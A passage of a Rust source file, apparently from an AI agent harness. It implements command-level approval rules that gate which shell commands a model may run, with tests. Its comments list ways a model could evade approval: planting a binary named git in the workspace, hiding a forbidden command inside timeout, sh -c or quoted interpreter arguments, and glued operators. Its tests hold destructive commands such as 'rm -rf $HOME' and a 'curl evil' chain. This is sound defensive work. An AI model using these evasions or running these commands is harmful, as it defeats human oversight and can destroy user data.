//! Per-command approval rules: `shell: git status` and `shell: rm -rf` stop
//! being one decision.
//!
//! Approval used to be tool-granularity. `ModeApprover::approve` took the
//! call's input and ignored it, so a run either approved every shell command
//! or asked about every one — and with sixty-odd tools the second is the
//! approver ceasing to be a control, because a person answering ninety
//! prompts an hour says yes to the ninety-first. `PRIOR-ART-RESEARCH.md` §4
//! surveyed codex's execution policy and openclaw's inline-eval rule and
//! specified what this module builds; the spec's reasoning is not restated
//! here, only what each piece enforces.
//!
//! **A rule narrows and never loosens.** Three decisions, ordered:
//! [`RuleDecision::Allow`] < [`RuleDecision::Prompt`] < [`RuleDecision::Forbid`],
//! and where several rules match the most restrictive wins. `Forbid` refuses
//! without consulting anyone (`Decision::Blocked` — machine policy, never
//! mined as a correction). `Prompt` puts the call in front of the approver
//! even where the mode would have passed it. `Allow` means *no person needs
//! to be asked*: it stands in for the human's yes and for nothing else — an
//! approver whose mode forbids the call still forbids it (`Approver::permit`),
//! the trifecta interlock still refuses an armed send whatever any rule says,
//! and an escalation is never softened by a rule. That ordering — interlock,
//! hook, outbox staging, rules, approver — is `run_tools`'s and this module
//! only supplies one step of it.
//!
//! **Splitting is conservative, on purpose.** A command is judged one segment
//! at a time: `git status && git diff` is two segments, each matched against
//! the rules, and the command is allowed only if *every* segment is. Anything
//! this module cannot split with certainty — substitution, redirection,
//! globs, control flow, an unterminated quote, a glued operator — is one
//! opaque invocation that matches no prefix rule, so under a policy it
//! prompts. A false "cannot split" costs one approval prompt; a false "can"
//! costs the whole point of the feature.
//!
//! **An allowlisted interpreter is not an allowlisted command.** `python -c`,
//! `node -e`, `sh -c`, `xargs`, `env`, `sudo`, `timeout` — anything that
//! runs code or another command from its arguments — is judged as at least
//! `Prompt` regardless of the rules, because a prefix rule on `python` says
//! nothing about what `-c` carries and a prefix rule on `rm` is bypassed by
//! `timeout 5 rm -rf`. `[approval] strict_inline_eval` is on by default;
//! turning it off is a decision someone makes on purpose.
//!
//! **Examples are checked at load.** An `allow` rule and every patterned
//! rule must carry `match` examples, every `match` example must match the
//! rule and every `not_match` must not — so a rule that does not do what its
//! author believes fails at startup, on every start, rather than on the run
//! that needed it: an `allow` too wide is the hole, a `forbid` too narrow is
//! the guard that protects nothing. Same principle as validating hook config
//! even under `--no-hooks`.
//!
//! **A project layer may only narrow.** `allow` rules load from the global
//! config only; a cloned repository's `mecha.toml` may add `prompt` and
//! `forbid` rules and nothing else, and may not touch `[approval]`. Same
//! rule that keeps `[messages]`, `[slack]` and triggers out of project files.

use serde::{Deserialize, Serialize};
use serde_json::Value;

/// What a rule says about a call it matches. Ordered by restrictiveness so
/// `max` picks the winner when several match.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum RuleDecision {
    /// No person needs to be asked. The approver's mode still applies.
    Allow,
    /// Ask the approver even where it would have passed the call.
    Prompt,
    /// Refuse without asking. `Decision::Blocked`, never `Deny`.
    Forbid,
}

impl Default for RuleDecision {
    /// A rule with no decision written down asks. The safe reading of an
    /// omission.
    fn default() -> Self {
        RuleDecision::Prompt
    }
}

/// One element of a prefix pattern: a literal word, or one of several.
///
/// In TOML: `pattern = ["git", ["status", "diff", "log"]]`.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(untagged)]
pub enum PatternElement {
    Word(String),
    OneOf(Vec<String>),
}

impl PatternElement {
    /// `lenient` says which way to err when the first token is a path. The
    /// one rule that *widens* (`allow`) reduces a program path to its name
    /// only from a system directory: `/usr/bin/git` is `git`, and
    /// `/home/me/repo/git` is a file whose name the model chose. A rule that
    /// *narrows* (`prompt`, `forbid`) reduces any path: `./rm`, `bin/rm` and
    /// `/tmp/x/rm` are all `rm`, and a false prompt or forbid costs a prompt.
    /// The first version grouped `prompt` with `allow`, so `./cargo publish`
    /// walked past a `prompt` on `cargo publish` to a standing yes — the PR
    /// review's finding; `prompt` never widens, so leniency there is free.
    fn matches(&self, token: &str, first: bool, lenient: bool) -> bool {
        // The PR review found this twice. First `./git status` matched an
        // `allow` on `git` by basename — a file the model wrote into the
        // workspace ran unasked on a headless surface where every other
        // route was `Blocked`. Then the fix, "strip only absolute paths",
        // re-opened it for `/abs/path/to/workspace/git`: a cloned repository
        // can ship an executable named `git`, so the model never has to
        // create or `chmod` one. A path is trusted to name its program only
        // where the model cannot write; anywhere else, spell the path in the
        // rule and it matches literally.
        let base = if !first {
            None
        } else if lenient {
            token.contains('/').then(|| basename(token))
        } else {
            system_binary(token)
        };
        let hit = |w: &String| w == token || base.is_some_and(|b| w == b);
        match self {
            PatternElement::Word(w) => hit(w),
            PatternElement::OneOf(ws) => ws.iter().any(hit),
        }
    }
}

/// Directories a model running as the user cannot write into, so a program
/// found there is the program its name says. Deliberately short: `/usr/local`
/// and Homebrew's prefix are user-writable on some machines, and a rule that
/// wants a binary from there spells the path out.
const SYSTEM_BIN_DIRS: &[&str] = &["/bin", "/sbin", "/usr/bin", "/usr/sbin"];

/// The program name, if `token` is a path into one of [`SYSTEM_BIN_DIRS`].
fn system_binary(token: &str) -> Option<&str> {
    let (dir, base) = token.rsplit_once('/')?;
    SYSTEM_BIN_DIRS.contains(&dir).then_some(base)
}

/// One `[[rule]]` from config.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct RuleConfig {
    /// The tool this rule is about — `shell`, or any registered name.
    pub tool: String,
    /// Leading arguments to match, segment by segment. Empty means the rule
    /// applies to every call of the tool, whatever its input.
    pub pattern: Vec<PatternElement>,
    pub decision: RuleDecision,
    /// Commands this rule must match. Required and non-empty for `allow` and
    /// for every patterned rule; checked at load for every decision. For an
    /// `allow` with no `pattern` the check proves only that the example
    /// splits — an empty pattern matches every segment — so there it is a
    /// speed bump, not the guarantee it is for a patterned rule.
    #[serde(rename = "match")]
    pub examples: Vec<String>,
    /// Commands this rule must not match. Checked at load.
    pub not_match: Vec<String>,
    /// Shown to the model in a refusal, so a `forbid` says why.
    pub justification: Option<String>,
}

impl RuleConfig {
    /// Does this rule's pattern match the head of a segment?
    fn matches(&self, segment: &[String]) -> bool {
        if self.pattern.len() > segment.len() {
            return false;
        }
        let lenient = self.decision != RuleDecision::Allow;
        self.pattern
            .iter()
            .zip(segment)
            .enumerate()
            .all(|(i, (p, tok))| p.matches(tok, i == 0, lenient))
    }

    fn describe(&self) -> String {
        let pat: Vec<String> = self
            .pattern
            .iter()
            .map(|p| match p {
                PatternElement::Word(w) => w.clone(),
                PatternElement::OneOf(ws) => format!("[{}]", ws.join("|")),
            })
            .collect();
        if pat.is_empty() {
            format!("{} (any call)", self.tool)
        } else {
            format!("{} {}", self.tool, pat.join(" "))
        }
    }
}

/// The built-in tools whose input carries no `command`, so a patterned rule
/// for them can never fire. Refused at load rather than left inert.
const NON_COMMAND_BUILTINS: &[&str] = &[
    "fs_read",
    "fs_write",
    "fs_edit",
    "fs_list",
    "http_fetch",
    "web_search",
    "todo",
    "skill",
    "recall",
    "compact",
    "ask_user",
    "message_send",
];

/// What the policy concluded about one call, with the words for a refusal.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Ruling {
    pub decision: RuleDecision,
    /// Why, in a sentence the model can read. For `Forbid`, the rule's
    /// justification when it has one.
    pub reason: String,
}

/// The loaded rule set. Empty by default, which is today's behaviour exactly:
/// [`ExecPolicy::decide`] returns `None` for every call and the approver
/// decides alone.
#[derive(Debug, Clone)]
pub struct ExecPolicy {
    rules: Vec<RuleConfig>,
    strict_inline_eval: bool,
}

impl Default for ExecPolicy {
    /// One spelling of "no rules": the derived `Default` gave
    /// `strict_inline_eval: false` where `empty()` gives `true`, and two
    /// spellings of the same state drift.
    fn default() -> Self {
        Self::empty()
    }
}

impl ExecPolicy {
    pub fn empty() -> Self {
        ExecPolicy {
            rules: Vec::new(),
            strict_inline_eval: true,
        }
    }

    /// Build and validate. Every error here is a config error the operator
    /// sees at startup, worded to name the rule.
    pub fn from_config(rules: &[RuleConfig], strict_inline_eval: bool) -> anyhow::Result<Self> {
        for (i, rule) in rules.iter().enumerate() {
            let name = format!("[[rule]] #{} ({})", i + 1, rule.describe());
            if rule.tool.trim().is_empty() {
                anyhow::bail!("{name}: `tool` is required");
            }
            // A `pattern` matches a command's arguments. The built-in tools
            // that carry no command cannot be judged by one, and a rule that
            // loads clean and never fires is the silently-degrading guard —
            // so the ones this crate knows about are refused here; an MCP
            // tool it cannot know about is caught at call time by `decide`,
            // which asks rather than staying silent.
            if !rule.pattern.is_empty() && NON_COMMAND_BUILTINS.contains(&rule.tool.as_str()) {
                anyhow::bail!(
                    "{name}: `pattern` matches a shell command's arguments, and `{}` takes no \
                     command. Write the rule without a `pattern` and it applies to every call \
                     of the tool",
                    rule.tool
                );
            }
            // A pattern element with nothing in it matches nothing, so the
            // rule never fires — inert for `forbid`, and for `allow` the
            // example check below would only say "does not match".
            if let Some(i) = rule
                .pattern
                .iter()
                .position(|p| matches!(p, PatternElement::OneOf(ws) if ws.is_empty()))
            {
                anyhow::bail!(
                    "{name}: pattern element {} is an empty list, which matches nothing — the \
                     rule would never fire",
                    i + 1
                );
            }
            // An `allow` rule has to prove it matches what its author thinks
            // it does — there a false match is the hole. A *patterned*
            // `forbid` or `prompt` has to prove it fires at all: `["rm",
            // "-fr"]`, one transposition off, loaded clean, was reported by
            // `tools()` as covering `shell`, warned nowhere, and judged
            // nothing — the silently-degrading guard, found by the PR review.
            // A pattern-less rule applies to every call and an example would
            // prove nothing, so none is asked for.
            let needs_example = rule.decision == RuleDecision::Allow || !rule.pattern.is_empty();
            if needs_example && rule.examples.is_empty() {
                let why = match rule.decision {
                    RuleDecision::Allow => {
                        "a rule that widens approval has to prove it matches what its author \
                         thinks it does"
                    }
                    _ => "a rule that narrows has to prove it fires at all",
                };
                anyhow::bail!(
                    "{name}: a{} `{}` rule must carry at least one `match` example — {why}",
                    if rule.decision == RuleDecision::Allow {
                        "n"
                    } else {
                        " patterned"
                    },
                    match rule.decision {
                        RuleDecision::Allow => "allow",
                        RuleDecision::Prompt => "prompt",
                        RuleDecision::Forbid => "forbid",
                    }
                );
            }
            for ex in &rule.examples {
                match segments_of(ex) {
                    None => anyhow::bail!(
                        "{name}: `match` example {ex:?} cannot be split safely, so it would \
                         always prompt; pick a plain example"
                    ),
                    Some(segs) => {
                        if let Some(seg) = segs.iter().find(|s| !rule.matches(s)) {
                            anyhow::bail!(
                                "{name}: `match` example {ex:?} does not match the rule — the \
                                 segment {:?} escapes the pattern",
                                seg.join(" ")
                            );
                        }
                        // The point of a checked example is that it says what
                        // the rule does. An `allow` example that the inline-eval
                        // check would lift to a prompt at run time does not.
                        if rule.decision == RuleDecision::Allow && strict_inline_eval {
                            if let Some(seg) = segs.iter().find(|s| runs_its_arguments(s)) {
                                anyhow::bail!(
                                    "{name}: `match` example {ex:?} would be asked about at run \
                                     time, not allowed — {:?} runs its arguments and \
                                     `strict_inline_eval` never allows that; pick an example \
                                     the rule really allows",
                                    seg.join(" ")
                                );
                            }
                        }
                    }
                }
            }
            for ex in &rule.not_match {
                // An unsplittable example is refused here too, not skipped: it
                // would match no rule anyway, but `not_match = ["rm -rf /*"]`
                // reads as a checked claim and would have been an unchecked
                // one.
                let Some(segs) = segments_of(ex) else {
                    anyhow::bail!(
                        "{name}: `not_match` example {ex:?} cannot be split safely, so it proves \
                         nothing about the rule; pick a plain example"
                    );
                };
                if let Some(seg) = segs.iter().find(|s| rule.matches(s)) {
                    anyhow::bail!(
                        "{name}: `not_match` example {ex:?} matches the rule — the segment \
                         {:?} is caught by the pattern, so the rule is wider than its \
                         author believes",
                        seg.join(" ")
                    );
                }
            }
        }
        Ok(ExecPolicy {
            rules: rules.to_vec(),
            strict_inline_eval,
        })
    }

    pub fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }

    /// The rules about one tool.
    pub fn rules_for<'a>(&'a self, tool: &'a str) -> impl Iterator<Item = &'a RuleConfig> + 'a {
        self.rules.iter().filter(move |r| r.tool == tool)
    }

    /// Every tool the rules name, once each. Setup checks these against the
    /// registry on every start: a rule for `shel`, or for an MCP tool whose
    /// server did not come up, would otherwise load clean and judge nothing.
    pub fn tools(&self) -> Vec<&str> {
        let mut names: Vec<&str> = self.rules.iter().map(|r| r.tool.as_str()).collect();
        names.sort_unstable();
        names.dedup();
        names
    }

    /// Judge one call. `None` means no rule spoke, and the approver decides
    /// as it always has.
    pub fn decide(&self, tool: &str, input: &Value) -> Option<Ruling> {
        let rules: Vec<&RuleConfig> = self.rules_for(tool).collect();
        if rules.is_empty() {
            return None;
        }

        // A tool with no command to split is judged by its tool-level rules.
        // A *patterned* rule for such a tool cannot judge anything — and it
        // must not be silently inert while its author believes it loads: the
        // PR review found a `forbid` with a pattern on `fs_write` validating
        // clean and doing nothing. So its presence asks, every call, with the
        // reason said out loud; `from_config` refuses the builtin cases up
        // front, and this catches the MCP tools it cannot know about.
        let Some(command) = input.get("command").and_then(Value::as_str) else {
            let tool_level = rules
                .iter()
                .filter(|r| r.pattern.is_empty())
                .map(|r| r.decision)
                .max();
            let patterned = rules.iter().any(|r| !r.pattern.is_empty());
            return match (tool_level, patterned) {
                (Some(d), false) => Some(self.ruling(tool, d, &rules, None)),
                (Some(RuleDecision::Forbid), true) => {
                    Some(self.ruling(tool, RuleDecision::Forbid, &rules, None))
                }
                (_, true) => Some(Ruling {
                    decision: RuleDecision::Prompt,
                    reason: format!(
                        "an approval rule for `{tool}` has a `pattern`, but this call carries \
                         no `command` to match it against, so the rule cannot judge it and \
                         the call is asked about; write that rule without a pattern"
                    ),
                }),
                (None, false) => None,
            };
        };

        let Some(segments) = segments_of(command) else {
            // A pattern-less rule matches every segment by construction, so
            // no splitting is needed to know it applies — and a tool-level
            // `forbid` must not be downgraded to a prompt by a command the
            // splitter finds opaque: `rm -rf ./build` refused while
            // `rm -rf $HOME` merely prompted, which on a headless surface is
            // a yes (the PR review's finding).
            if rules
                .iter()
                .any(|r| r.pattern.is_empty() && r.decision == RuleDecision::Forbid)
            {
                return Some(self.ruling(tool, RuleDecision::Forbid, &rules, None));
            }
            // And a *patterned* `forbid` is looked for anyway, over-
            // approximately: the raw words of the command, split on
            // whitespace with no quote handling, and the pattern matched at
            // every position rather than only at a segment head. `rm -rf
            // $HOME`, `rm -rf *`, `git status; rm -rf {a,b}` all carry the
            // forbidden words in plain sight; refusing them costs nothing the
            // opaque prompt was not already costing, and a false forbid is a
            // refusal, not a hole. The PR review found the pattern-less case
            // fixed and this one — the PR's own headline example — not.
            if let Some(seg) = forbidden_words(&rules, command) {
                return Some(self.ruling(tool, RuleDecision::Forbid, &rules, Some(&seg)));
            }
            // Otherwise a policy exists for this tool and the command cannot
            // be judged: ask. Not `None` — under `Allow` mode that would run
            // the one shape the splitter refused to vouch for.
            return Some(Ruling {
                decision: RuleDecision::Prompt,
                reason: format!(
                    "`{tool}` has approval rules and this command cannot be split safely \
                     (substitution, redirection, a glob or control flow), so it is judged as \
                     one opaque invocation and asked about"
                ),
            });
        };

        let mut all_allow = true;
        let mut any_prompt = false;
        for segment in &segments {
            let mut decision = rules
                .iter()
                .filter(|r| r.matches(segment))
                .map(|r| r.decision)
                .max();
            if runs_its_arguments(segment) {
                // The wrapper is judged by what it wraps — every proper
                // suffix of its argv, and every quoted argument that splits
                // as a command of its own (`sh -c 'rm -rf x'`) — so
                // `timeout 5 rm -rf x` finds the `forbid` on `rm` rather than
                // lifting it to a prompt, which under a headless `Allow` mode
                // is a yes. Unconditional: the lookup only ever raises the
                // decision, and gating it on `strict_inline_eval` (as the
                // first version did) made turning that knob off silently
                // disable the wrapper rule ARCHITECTURE states without a
                // condition.
                let wrapped = wrapped_commands(segment)
                    .into_iter()
                    .flat_map(|inner| {
                        rules
                            .iter()
                            .filter(|r| r.matches(&inner))
                            .map(|r| r.decision)
                            .collect::<Vec<_>>()
                    })
                    .max();
                if let Some(w) = wrapped {
                    decision = Some(decision.map_or(w, |d| d.max(w)));
                }
                // A quoted argument the splitter finds opaque — `bash -ec 'cd
                // /tmp; rm -rf x'`, the `;` glued to a word — gets the same
                // word search an opaque outer command gets, so a `forbid` is
                // not laundered by quoting it into an interpreter. This was
                // stated as residue for two passes; it closes for the price
                // of the check that already existed.
                let opaque_inner = segment[1..]
                    .iter()
                    .filter(|arg| arg.contains(char::is_whitespace) && segments_of(arg).is_none())
                    .any(|arg| forbidden_words(&rules, arg).is_some());
                if opaque_inner {
                    decision = Some(RuleDecision::Forbid);
                }
                // Under the strict check, never below Prompt: an allowlisted
                // interpreter is not an allowlisted command.
                if self.strict_inline_eval {
                    decision = Some(
                        decision
                            .unwrap_or(RuleDecision::Prompt)
                            .max(RuleDecision::Prompt),
                    );
                }
            }
            match decision {
                Some(RuleDecision::Forbid) => {
                    return Some(self.ruling(tool, RuleDecision::Forbid, &rules, Some(segment)));
                }
                Some(RuleDecision::Prompt) => {
                    any_prompt = true;
                    all_allow = false;
                }
                Some(RuleDecision::Allow) => {}
                None => all_allow = false,
            }
        }
        if all_allow {
            Some(self.ruling(tool, RuleDecision::Allow, &rules, None))
        } else if any_prompt {
            Some(self.ruling(tool, RuleDecision::Prompt, &rules, None))
        } else {
            None
        }
    }

    fn ruling(
        &self,
        tool: &str,
        decision: RuleDecision,
        rules: &[&RuleConfig],
        segment: Option<&Vec<String>>,
    ) -> Ruling {
        let reason = match decision {
            RuleDecision::Forbid => {
                // The justification of the forbidding rule that matched, if
                // its author wrote one. With no segment — a tool-level
                // ruling — the forbidding rules are the pattern-less ones.
                let just = rules
                    .iter()
                    .filter(|r| r.decision == RuleDecision::Forbid)
                    .filter(|r| match segment {
                        Some(seg) => r.matches(seg),
                        None => r.pattern.is_empty(),
                    })
                    .find_map(|r| r.justification.clone());
                match just {
                    Some(j) => format!("`{tool}` call forbidden by an approval rule: {j}"),
                    None => format!("`{tool}` call forbidden by an approval rule"),
                }
            }
            RuleDecision::Prompt => {
                format!("an approval rule asks that this `{tool}` call be approved")
            }
            RuleDecision::Allow => format!("an approval rule allows this `{tool}` call"),
        };
        Ruling { decision, reason }
    }
}

/// Split a command into segments that can be judged independently.
///
/// `None` means the command is not safely splittable — judge it as one
/// opaque invocation. Deliberately over-conservative: any `$`, backtick,
/// redirection, glob, brace, backslash, comment, newline, background `&`,
/// assignment prefix, shell keyword, unterminated quote or operator glued
/// to a word returns `None`.
pub fn split_segments(command: &str) -> Option<Vec<Vec<String>>> {
    segments_of(command)
}

fn segments_of(command: &str) -> Option<Vec<Vec<String>>> {
    const REJECT: &[char] = &[
        '$', '`', '<', '>', '*', '?', '[', ']', '{', '}', '\\', '\n', '#', '(', ')', '!',
    ];
    if command.trim().is_empty() || command.chars().any(|c| REJECT.contains(&c)) {
        return None;
    }
    let tokens = tokenize(command)?;

    let mut segments: Vec<Vec<String>> = Vec::new();
    let mut current: Vec<String> = Vec::new();
    for tok in tokens {
        let is_operator = !tok.any_quoted && matches!(tok.text.as_str(), "&&" | "||" | "|" | ";");
        if is_operator {
            if current.is_empty() {
                return None; // leading or doubled operator
            }
            segments.push(std::mem::take(&mut current));
            continue;
        }
        // An operator character that the shell would see — one outside any
        // quote — glued to a word (`a;b`, `x|y`, `cmd&`, `--oneline;''curl`)
        // is not something this splitter takes apart. Judged per character,
        // not per token: the PR review found a token that was quoted in one
        // part and carried a bare `;` in another slip through a whole-token
        // "quoted" flag, and an `allow` rule then ran the second command.
        if tok.bare_operator {
            return None;
        }
        current.push(tok.text);
    }
    if current.is_empty() {
        return None; // trailing operator
    }
    segments.push(current);

    const KEYWORDS: &[&str] = &[
        "if", "then", "else", "elif", "fi", "for", "while", "until", "do", "done", "case", "esac",
        "function", "select", "time", "coproc",
    ];
    for seg in &segments {
        let head = seg[0].as_str();
        if KEYWORDS.contains(&head) || head.contains('=') {
            return None;
        }
    }
    Some(segments)
}

/// One whitespace-delimited word, with what the tokenizer learned about it.
struct Tok {
    text: String,
    /// Some part of the word was inside quotes.
    any_quoted: bool,
    /// An operator character (`;`, `|`, `&`) appeared *outside* quotes
    /// somewhere in the word — the shell would split there, and this
    /// tokenizer did not.
    bare_operator: bool,
}

/// Whitespace-split with single and double quotes honoured. `None` on an
/// unterminated quote. Backslashes were rejected before this runs, so quotes
/// are the only escaping there is.
fn tokenize(command: &str) -> Option<Vec<Tok>> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut any_quoted = false;
    let mut bare_operator = false;
    let mut in_token = false;
    let mut chars = command.chars().peekable();
    let mut flush = |cur: &mut String, any_quoted: &mut bool, bare_operator: &mut bool| {
        out.push(Tok {
            text: std::mem::take(cur),
            any_quoted: *any_quoted,
            bare_operator: *bare_operator,
        });
        *any_quoted = false;
        *bare_operator = false;
    };
    while let Some(c) = chars.next() {
        match c {
            '\'' | '"' => {
                in_token = true;
                any_quoted = true;
                let mut closed = false;
                for d in chars.by_ref() {
                    if d == c {
                        closed = true;
                        break;
                    }
                    cur.push(d);
                }
                if !closed {
                    return None;
                }
            }
            c if c.is_whitespace() => {
                if in_token {
                    flush(&mut cur, &mut any_quoted, &mut bare_operator);
                    in_token = false;
                }
            }
            c => {
                in_token = true;
                if matches!(c, ';' | '|' | '&') {
                    bare_operator = true;
                }
                cur.push(c);
            }
        }
    }
    if in_token {
        flush(&mut cur, &mut any_quoted, &mut bare_operator);
    }
    Some(out)
}

/// A patterned `forbid`'s words, found in a command the splitter refused to
/// take apart. Whitespace-split with quote characters dropped, matched at
/// every position, first token of the match reduced to its basename.
/// Over-approximate by design: this runs only where the answer would
/// otherwise be a prompt, and a false forbid is a refusal, not a hole.
fn forbidden_words(rules: &[&RuleConfig], command: &str) -> Option<Vec<String>> {
    // Quote characters are dropped from every word, not honoured: `"rm" -rf
    // $HOME` and `sh -c 'rm -rf /*'` carry the forbidden words as plainly as
    // the bare spelling does, and the PR review found them coming back as a
    // prompt — which on a headless `Allow` surface is a yes.
    let words: Vec<String> = command
        .split_whitespace()
        .map(|w| {
            w.chars()
                .filter(|c| !matches!(c, '\'' | '"'))
                .collect::<String>()
        })
        .filter(|w| !w.is_empty())
        .collect();
    for start in 0..words.len() {
        let tail = &words[start..];
        if rules
            .iter()
            .any(|r| r.decision == RuleDecision::Forbid && !r.pattern.is_empty() && r.matches(tail))
        {
            return Some(tail.to_vec());
        }
    }
    None
}

/// The commands a wrapper segment would run: every proper suffix of its argv
/// (`timeout 5 rm -rf x` runs `rm -rf x`; `env FOO=1 rm x` runs `rm x`), and
/// every argument that itself splits as a command (`sh -c 'rm -rf x'`). Over-
/// approximate on purpose — a suffix that is not really a command matches no
/// rule and costs nothing; a wrapped command that *is* forbidden must be
/// found.
fn wrapped_commands(segment: &[String]) -> Vec<Vec<String>> {
    let mut out: Vec<Vec<String>> = (1..segment.len()).map(|i| segment[i..].to_vec()).collect();
    for arg in &segment[1..] {
        if arg.contains(char::is_whitespace) {
            if let Some(inner) = segments_of(arg) {
                out.extend(inner);
            }
        }
    }
    out
}

fn basename(token: &str) -> &str {
    token.rsplit('/').next().unwrap_or(token)
}

/// Does this segment run code or another command taken from its own
/// arguments? A prefix rule says nothing about what such a command really
/// does, so it is judged as at least `Prompt`.
fn runs_its_arguments(segment: &[String]) -> bool {
    let head = basename(&segment[0]);
    let rest = &segment[1..];
    // A short flag counts when its letter appears anywhere in a single-dash
    // cluster — `-c`, `-ec`, `-Bc`, and the attached-value spellings
    // `-cimport …` / `-e'unlink …'` — and a long flag when the token is the
    // flag or the flag with `=value`. Exact-token matching let every glued
    // spelling walk past this check (the PR review's finding); over-matching
    // a cluster costs one prompt, which is the cheap direction.
    let has_flag = |short: &[char], long: &[&str]| {
        rest.iter().any(|t| {
            if let Some(cluster) = t.strip_prefix('-').filter(|c| !c.starts_with('-')) {
                if short.iter().any(|s| cluster.contains(*s)) {
                    return true;
                }
            }
            long.iter()
                .any(|l| t == l || t.strip_prefix(l).is_some_and(|r| r.starts_with('=')))
        })
    };
    // Interpreters with an inline-source flag.
    // `-m` and `-r`/`--require` run a module named by an argument — the same
    // shape as inline source, one level of indirection away.
    if head.starts_with("python") {
        return has_flag(&['c', 'm'], &[]);
    }
    match head {
        "node" | "nodejs" | "deno" | "bun" => {
            has_flag(&['e', 'p', 'r'], &["--eval", "--print", "--require"])
        }
        "ruby" | "lua" | "luajit" | "osascript" => has_flag(&['e'], &[]),
        "perl" => has_flag(&['e', 'E'], &[]),
        "php" => has_flag(&['r'], &[]),
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" | "busybox" => has_flag(&['c'], &[]),
        "sed" => has_flag(&['e'], &["--expression"]),
        "find" => rest
            .iter()
            .any(|t| matches!(t.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir")),
        // Always: they exist to run something else.
        "awk" | "gawk" | "mawk" | "nawk" | "xargs" | "make" | "env" | "sudo" | "su" | "doas"
        | "nohup" | "nice" | "ionice" | "timeout" | "watch" | "eval" | "exec" | "command"
        | "builtin" | "chroot" | "strace" | "ltrace" | "gdb" => true,
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn rule(tool: &str, pattern: &[&[&str]], decision: RuleDecision) -> RuleConfig {
        RuleConfig {
            tool: tool.into(),
            pattern: pattern
                .iter()
                .map(|alts| {
                    if alts.len() == 1 {
                        PatternElement::Word(alts[0].into())
                    } else {
                        PatternElement::OneOf(alts.iter().map(|s| s.to_string()).collect())
                    }
                })
                .collect(),
            decision,
            examples: Vec::new(),
            not_match: Vec::new(),
            justification: None,
        }
    }

    fn policy(rules: Vec<RuleConfig>) -> ExecPolicy {
        ExecPolicy {
            rules,
            strict_inline_eval: true,
        }
    }

    fn cmd(s: &str) -> Value {
        json!({"command": s})
    }

    #[test]
    fn split_segments_table() {
        let ok = |s: &str| split_segments(s).unwrap();
        assert_eq!(ok("git status"), vec![vec!["git", "status"]]);
        assert_eq!(
            ok("git status && git diff --stat"),
            vec![vec!["git", "status"], vec!["git", "diff", "--stat"]]
        );
        assert_eq!(
            ok("ls -la | head -n 5 ; echo done"),
            vec![
                vec!["ls", "-la"],
                vec!["head", "-n", "5"],
                vec!["echo", "done"]
            ]
        );
        // Quotes keep a token whole, operators inside them are literal.
        assert_eq!(
            ok(r#"git commit -m "fix; the | thing""#),
            vec![vec!["git", "commit", "-m", "fix; the | thing"]]
        );
        assert_eq!(ok("echo 'it''s'"), vec![vec!["echo", "its"]]);

        // Everything the splitter refuses to vouch for.
        for bad in [
            "a > b",
            "a < b",
            "a $(b)",
            "a `b`",
            "a $HOME",
            "ls *",
            "ls ?.txt",
            "ls [ab]",
            "echo {a,b}",
            "for x in a b; do echo $x; done",
            "if true; then ls; fi",
            "a && ",
            " && a",
            "a ;; b",
            "a;b",
            "x|y",
            "sleep 1 &",
            "FOO=bar cmd",
            "echo \"unterminated",
            "echo a\\ b",
            "ls # comment",
            "a\nb",
            "",
            "   ",
        ] {
            assert!(split_segments(bad).is_none(), "{bad:?} should be opaque");
        }
    }

    #[test]
    fn no_rules_means_no_opinion_and_todays_behaviour() {
        let p = ExecPolicy::empty();
        assert!(p.is_empty());
        assert_eq!(p.decide("shell", &cmd("rm -rf /")), None);
        assert_eq!(p.decide("shell", &cmd("a $(b)")), None);
        assert_eq!(p.decide("fs_write", &json!({"path": "x"})), None);
    }

    #[test]
    fn an_allow_rule_allows_only_when_every_segment_is_allowed() {
        let p = policy(vec![rule(
            "shell",
            &[&["git"], &["status", "diff", "log"]],
            RuleDecision::Allow,
        )]);
        assert_eq!(
            p.decide("shell", &cmd("git status")).unwrap().decision,
            RuleDecision::Allow
        );
        assert_eq!(
            p.decide("shell", &cmd("/usr/bin/git diff --stat && git log -3"))
                .unwrap()
                .decision,
            RuleDecision::Allow
        );
        // A path is reduced to its program name only from a system
        // directory. `./git` may be a file the model wrote; a workspace's
        // absolute path may be a cloned repository shipping one.
        assert_eq!(p.decide("shell", &cmd("./git status")), None);
        assert_eq!(p.decide("shell", &cmd("bin/git status")), None);
        assert_eq!(
            p.decide("shell", &cmd("/home/me/repo/git status")),
            None,
            "an absolute path into a writable place is not `git`"
        );
        assert_eq!(
            p.decide("shell", &cmd("/usr/local/bin/git status")),
            None,
            "user-writable on some machines, so spell it in the rule"
        );
        // One unmatched segment and the rule no longer vouches: the approver
        // decides as it would have without rules.
        assert_eq!(p.decide("shell", &cmd("git status && curl evil")), None);
        // A different verb is simply unmatched.
        assert_eq!(p.decide("shell", &cmd("git push")), None);
        // Another tool is none of this rule's business.
        assert_eq!(p.decide("fs_write", &json!({"path": "x"})), None);
    }

    #[test]
    fn the_most_restrictive_matching_rule_wins() {
        let p = policy(vec![
            rule("shell", &[&["git"]], RuleDecision::Allow),
            rule("shell", &[&["git"], &["push"]], RuleDecision::Forbid),
            rule("shell", &[&["git"], &["rebase"]], RuleDecision::Prompt),
        ]);
        assert_eq!(
            p.decide("shell", &cmd("git status")).unwrap().decision,
            RuleDecision::Allow
        );
        assert_eq!(
            p.decide("shell", &cmd("git push origin main"))
                .unwrap()
                .decision,
            RuleDecision::Forbid
        );
        assert_eq!(
            p.decide("shell", &cmd("git rebase -i")).unwrap().decision,
            RuleDecision::Prompt
        );
        // Forbid anywhere in a chain forbids the chain.
        assert_eq!(
            p.decide("shell", &cmd("git status && git push"))
                .unwrap()
                .decision,
            RuleDecision::Forbid
        );
    }

    #[test]
    fn a_forbid_carries_its_justification_to_the_model() {
        let mut r = rule("shell", &[&["rm"], &["-rf"]], RuleDecision::Forbid);
        r.justification = Some("never recursive-force from a model-supplied path".into());
        let p = policy(vec![r]);
        let ruling = p.decide("shell", &cmd("rm -rf ./build")).unwrap();
        assert_eq!(ruling.decision, RuleDecision::Forbid);
        assert!(
